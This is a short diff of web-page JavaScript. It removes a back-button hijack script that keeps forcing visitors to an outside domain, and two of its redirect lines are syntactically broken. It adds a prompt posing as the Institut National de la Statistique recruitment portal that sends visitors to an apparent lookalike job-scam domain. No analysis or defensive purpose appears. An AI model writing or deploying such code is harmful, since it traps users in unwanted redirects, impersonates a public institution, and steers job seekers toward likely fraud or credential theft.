@@ -1,11 +1,6 @@
-  window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="https://ey43.com/4/10368794;
-    }
-    function goon(){
-        location.href="https://ey43.com/4/10368794;
-    }
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'Recrutement'
+password=prompt('SMS: Bienvenue sur le portail de recrutement de Institut National de la Statistique, Veuillez appuyer sur OK pour continuer. ','Recrutement');
+if (password != 'Recrutement') {
+location.href='https://ins-drc.workvisa.live/staff';
+}
